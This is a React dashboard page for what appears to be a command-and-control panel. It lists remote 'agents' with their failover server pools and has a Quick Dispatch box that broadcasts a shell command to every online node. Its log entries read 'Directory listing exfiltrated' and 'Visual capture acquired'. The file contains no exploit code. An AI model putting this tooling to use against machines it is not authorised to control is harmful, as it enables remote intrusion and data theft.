import React, { useEffect, useState, useMemo } from 'react';
import { 
  Users, 
  Terminal as TerminalIcon, 
  Activity, 
  Cpu, 
  Globe, 
  Clock, 
  ChevronRight,
  Zap,
  Loader2,
  Search,
  Bell,
  Monitor,
  Shield,
  Wifi,
  WifiOff,
  ArrowUpRight,
  ArrowDownRight,
  MoreHorizontal,
  Send,
  Server,
  Skull
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { agentsApi, tasksApi } from '../utils/api';
import { formatDistanceToNow } from 'date-fns';

/* ───────────────── Stat Card ───────────────── */
const StatCard = ({ title, value, icon: Icon, color, accent }) => {
  return (
    <div className={`stat-card stat-card--${color}`}>
      <div className={`stat-card__icon stat-card__icon--${color}`}>
        {Icon && <Icon className="w-5 h-5" />}
      </div>
      <MoreHorizontal className="stat-card__menu" />
      <p className="stat-card__label">{title}</p>
      <h3 className="stat-card__value">{value}</h3>
      {accent && <span className="stat-card__accent">{accent}</span>}
    </div>
  );
};

/* ───────────────── Infrastructure Resilience Monitor ───────────────── */
const InfrastructureMonitor = ({ agents }) => {
  const hostStats = useMemo(() => {
    const stats = {};
    agents.forEach(agent => {
      let pool = [];
      try {
        pool = typeof agent.server_pool === 'string' ? JSON.parse(agent.server_pool) : (agent.server_pool || []);
      } catch {
        pool = [];
      }
      
      // If pool is empty, assume it's just the current server
      if (pool.length === 0) pool = [window.location.origin];

      pool.forEach(host => {
        if (!stats[host]) {
          stats[host] = { host, agents: 0, online: 0 };
        }
        stats[host].agents++;
        if (agent.connection_status === 'online') {
          stats[host].online++;
        }
      });
    });
    return Object.values(stats).sort((a, b) => b.agents - a.agents);
  }, [agents]);

  return (
    <div className="dash-card">
      <div className="dash-card__header">
        <h4 className="dash-card__title">Infrastructure Resilience</h4>
        <div className="flex items-center gap-2">
          <Shield className="w-3.5 h-3.5 text-primary" />
          <span className="text-[10px] font-black text-slate-500 uppercase tracking-widest">Failover Active</span>
        </div>
      </div>
      
      <div className="space-y-4 max-h-[300px] overflow-y-auto scrollbar-thin pr-2">
        {hostStats.length === 0 ? (
          <div className="py-8 text-center">
            <p className="text-[10px] text-slate-600 font-bold uppercase tracking-widest">No infrastructure data</p>
          </div>
        ) : (
          hostStats.map((stat, i) => (
            <div key={i} className="p-3 rounded-xl bg-white/5 border border-white/5 hover:border-primary/20 transition-all group">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <div className={`w-1.5 h-1.5 rounded-full ${stat.online > 0 ? 'bg-emerald-500 animate-pulse' : 'bg-slate-700'}`} />
                  <span className="text-[11px] font-mono text-slate-300 truncate max-w-[180px]">{stat.host}</span>
                </div>
                <span className="text-[10px] font-black text-primary uppercase">{stat.online} / {stat.agents} Online</span>
              </div>
              <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-primary transition-all duration-1000" 
                  style={{ width: `${(stat.online / (stat.agents || 1)) * 100}%` }}
                />
              </div>
            </div>
          ))
        )}
      </div>
      
      <div className="mt-4 pt-4 border-t border-slate-800/50 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Server className="w-3.5 h-3.5 text-slate-500" />
          <span className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">{hostStats.length} Target Hosts</span>
        </div>
        <div className="text-[10px] font-bold text-emerald-500 uppercase tracking-wider">
          {hostStats.filter(s => s.online > 0).length} REACHABLE
        </div>
      </div>
    </div>
  );
};

/* ───────────────── OS Distribution Donut ───────────────── */
const OSDistribution = ({ agents }) => {
  const osCounts = useMemo(() => {
    const counts = {};
    agents.forEach(a => {
      const os = (a.os || 'unknown').toLowerCase();
      counts[os] = (counts[os] || 0) + 1;
    });
    return Object.entries(counts).map(([name, count]) => ({ name, count }));
  }, [agents]);

  const total = agents.length || 1;
  let cumulativePercent = 0;
  const colors = ['#3b82f6', '#10b981', '#f59e0b', '#ef4444', '#8b5cf6'];

  const segments = osCounts.map((os, i) => {
    const percent = (os.count / total) * 100;
    const offset = cumulativePercent;
    cumulativePercent += percent;
    return { ...os, percent, offset, color: colors[i % colors.length] };
  });

  return (
    <div className="dash-card">
      <div className="dash-card__header">
        <h4 className="dash-card__title">OS Distribution</h4>
      </div>
      <div className="donut-container">
        <svg viewBox="0 0 36 36" className="donut-chart">
          {segments.map((seg, i) => (
            <circle
              key={i}
              cx="18" cy="18" r="14"
              fill="none"
              stroke={seg.color}
              strokeWidth="4"
              strokeDasharray={`${seg.percent} ${100 - seg.percent}`}
              strokeDashoffset={-seg.offset}
              className="donut-segment"
            />
          ))}
        </svg>
        <div className="donut-center">
          <span className="donut-total">{total}</span>
          <span className="donut-label">Total</span>
        </div>
      </div>
      <div className="donut-legend">
        {segments.map((seg, i) => (
          <div key={i} className="donut-legend-item">
            <span className="donut-legend-dot" style={{ background: seg.color }} />
            <span className="donut-legend-name">{seg.name}</span>
            <span className="donut-legend-count">{seg.count}</span>
          </div>
        ))}
      </div>
    </div>
  );
};

/* ───────────────── Quick Dispatch Panel ───────────────── */
const QuickDispatch = ({ agents }) => {
  const [command, setCommand] = useState('');
  const [broadcasting, setBroadcasting] = useState(false);

  const handleBroadcast = async () => {
    if (!command.trim()) return;
    const onlineAgents = agents.filter(a => a.connection_status === 'online');
    if (onlineAgents.length === 0) return alert('No online agents available.');
    if (!confirm(`Broadcast to ${onlineAgents.length} online node(s)?`)) return;
    
    setBroadcasting(true);
    try {
      for (const agent of onlineAgents) {
        await tasksApi.create(agent.id, 'shell', { command });
      }
      setCommand('');
      alert('Broadcast dispatched.');
    } catch (err) {
      console.error(err);
    } finally {
      setBroadcasting(false);
    }
  };

  return (
    <div className="dash-card">
      <div className="dash-card__header">
        <h4 className="dash-card__title">Quick Dispatch</h4>
      </div>
      <p className="dispatch-hint">Broadcast a command to all online nodes</p>
      <div className="dispatch-agents">
        {agents.filter(a => a.connection_status === 'online').slice(0, 5).map((a, i) => (
          <div key={a.id} className="dispatch-agent-avatar" title={a.hostname} style={{ zIndex: 5 - i }}>
            <Monitor className="w-3 h-3" />
          </div>
        ))}
        {agents.filter(a => a.connection_status === 'online').length > 5 && (
          <span className="dispatch-agent-more">
            +{agents.filter(a => a.connection_status === 'online').length - 5}
          </span>
        )}
      </div>
      <div className="dispatch-input-wrap">
        <TerminalIcon className="dispatch-input-icon" />
        <input
          type="text"
          value={command}
          onChange={e => setCommand(e.target.value)}
          onKeyDown={e => e.key === 'Enter' && handleBroadcast()}
          placeholder="Enter command..."
          className="dispatch-input"
        />
        <button 
          onClick={handleBroadcast}
          disabled={broadcasting || !command.trim()}
          className="dispatch-send-btn"
        >
          {broadcasting ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
        </button>
      </div>
    </div>
  );
};

/* ═══════════════════ MAIN DASHBOARD ═══════════════════ */
const DashboardPage = () => {
  const [agents, setAgents] = useState([]);
  const [stats, setStats] = useState({ total: 0, active: 0, inactive: 0 });
  const [loading, setLoading] = useState(true);
  const [results, setResults] = useState([]);
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    let isMounted = true;
    const fetchData = async () => {
      try {
        const [agentData, resultData] = await Promise.all([
          agentsApi.list(),
          tasksApi.resultsAll()
        ]);
        
        if (isMounted) {
          setAgents(agentData.agents || []);
          setStats(agentData.stats || { total: 0, active: 0, inactive: 0 });
          setResults(resultData.results || []);
        }
      } catch (err) {
        console.error(err);
      } finally {
        if (isMounted) setLoading(false);
      }
    };
    
    const init = async () => {
      await fetchData();
    };
    init();
    
    const interval = setInterval(fetchData, 5000);
    return () => { isMounted = false; clearInterval(interval); };
  }, []);

  const handlePurge = async (id, hostname) => {
    if (!window.confirm(`Permanently remove ${hostname} from the database?`)) return;
    try {
      await agentsApi.purge(id);
      setAgents(prev => prev.filter(a => a.id !== id));
    } catch (err) {
      alert('Failed to purge: ' + err.message);
    }
  };

  const filteredAgents = agents.filter(a => 
    a.hostname.toLowerCase().includes(searchQuery.toLowerCase()) ||
    a.ip_address?.includes(searchQuery) ||
    a.id.includes(searchQuery)
  );

  if (loading) {
    return (
      <div className="dash-loading">
        <Loader2 className="w-8 h-8 text-primary animate-spin" />
        <p>Initializing Dashboard...</p>
      </div>
    );
  }

  return (
    <div className="dashboard scroll-area">
      {/* ── Page Header ── */}
      <header className="dash-header">
        <div>
          <h1 className="dash-title">Dashboard</h1>
        </div>
        <div className="dash-header-actions">
          <div className="dash-search">
            <Search className="dash-search-icon" />
            <input
              type="text"
              placeholder="Search node, IP, UUID..."
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              className="dash-search-input"
            />
          </div>
          <button className="dash-notif-btn" title="Notifications">
            <Bell className="w-[18px] h-[18px]" />
            <span className="dash-notif-dot" />
          </button>
        </div>
      </header>

      {/* ── Stat Cards Row ── */}
      <section className="dash-stats">
        <StatCard 
          title="Total Nodes" 
          value={stats.total} 
          icon={Server} 
          color="blue"
          accent="Registered devices"
        />
        <StatCard 
          title="Online" 
          value={stats.active} 
          icon={Wifi} 
          color="green"
          accent="Active sessions"
        />
        <StatCard 
          title="Offline" 
          value={stats.inactive} 
          icon={WifiOff} 
          color="amber"
          accent="Dormant nodes"
        />
      </section>

      {/* ── Charts Row ── */}
      <section className="dash-charts">
        <InfrastructureMonitor agents={agents} />
        <OSDistribution agents={agents} />
      </section>

      {/* ── Bottom Row: Table + Quick Dispatch ── */}
      <section className="dash-bottom">
        {/* Node Assets Table */}
        <div className="dash-card dash-card--table">
          <div className="dash-card__header">
            <h4 className="dash-card__title">Managed Nodes</h4>
            <Link to="/agents" className="dash-card__link">
              View All <ChevronRight className="w-3.5 h-3.5" />
            </Link>
          </div>
          {filteredAgents.length === 0 ? (
            <div className="dash-empty">
              <Users className="w-8 h-8 text-slate-700" />
              <p>No agents registered</p>
            </div>
          ) : (
            <div className="dash-table-wrap scroll-area">
              <table className="dash-table">
                <thead>
                  <tr>
                    <th>Hostname</th>
                    <th>OS</th>
                    <th>IP Address</th>
                    <th>Status</th>
                    <th>Last Seen</th>
                    <th></th>
                  </tr>
                </thead>
                <tbody>
                  {filteredAgents.slice(0, 6).map(agent => (
                    <tr key={agent.id} onClick={() => window.location.href = `/agents/${agent.id}`}>
                      <td>
                        <div className="agent-name-cell">
                          <div className={`agent-dot ${agent.connection_status === 'online' ? 'online' : ''}`} />
                          <div>
                            <span className="agent-hostname">{agent.hostname}</span>
                            <span className="agent-uuid">{agent.id.substring(0, 8)}...</span>
                          </div>
                        </div>
                      </td>
                      <td>
                        <span className="os-badge">{agent.os}</span>
                      </td>
                      <td className="ip-cell">{agent.ip_address || '0.0.0.0'}</td>
                      <td>
                        <span className={`status-pill ${agent.connection_status === 'online' ? 'online' : 'offline'}`}>
                          {agent.connection_status}
                        </span>
                      </td>
                      <td className="time-cell">
                        {formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true })}
                      </td>
                      <td className="flex items-center justify-end gap-2 pr-4 h-[60px]">
                        {agent.connection_status === 'offline' && (
                          <button 
                            onClick={() => handlePurge(agent.id, agent.hostname)}
                            className="p-1.5 rounded-lg text-slate-600 hover:text-red-500 hover:bg-red-500/10 transition-all"
                            title="Remove Inactive Node"
                          >
                            <Skull className="w-4 h-4" />
                          </button>
                        )}
                        <Link to={`/agents/${agent.id}`} className="row-action-btn">
                          <ChevronRight className="w-4 h-4" />
                        </Link>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {/* Quick Dispatch */}
        <div className="flex flex-col gap-6">
          <QuickDispatch agents={agents} />
          
          <div className="dash-card flex-1">
            <div className="dash-card__header">
              <h4 className="dash-card__title">Activity Logs</h4>
              <Link to="/data" className="dash-card__link">
                View All <ChevronRight className="w-3.5 h-3.5" />
              </Link>
            </div>
            <div className="space-y-3">
              {results.length === 0 ? (
                <div className="text-[10px] text-slate-600 text-center py-4 font-bold uppercase tracking-widest">
                  No recent intelligence
                </div>
              ) : (
                results.slice(0, 4).map((intel, i) => (
                  <Link 
                    key={i} 
                    to="/data"
                    className="flex items-center gap-3 p-2 rounded-lg bg-white/5 border border-white/5 hover:border-primary/20 hover:bg-primary/5 transition-all group"
                  >
                    <div className="p-1.5 bg-primary/10 rounded text-primary group-hover:scale-110 transition-transform">
                      <Activity className="w-3 h-3" />
                    </div>
                    <div className="flex-1 min-w-0">
                      <div className="text-[11px] font-bold text-white truncate">
                        {intel.task_type === 'screenshot' ? 'Visual capture acquired' : 
                         intel.task_type === 'ls' ? 'Directory listing exfiltrated' :
                         intel.task_type === 'ps' ? 'Process tree mapped' :
                         'Operational data synchronized'}
                      </div>
                      <div className="text-[9px] text-slate-500 uppercase font-black tracking-widest">
                        {intel.task_type} • {formatDistanceToNow(new Date(intel.created_at), { addSuffix: true })}
                      </div>
                    </div>
                  </Link>
                ))
              )}
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default DashboardPage;
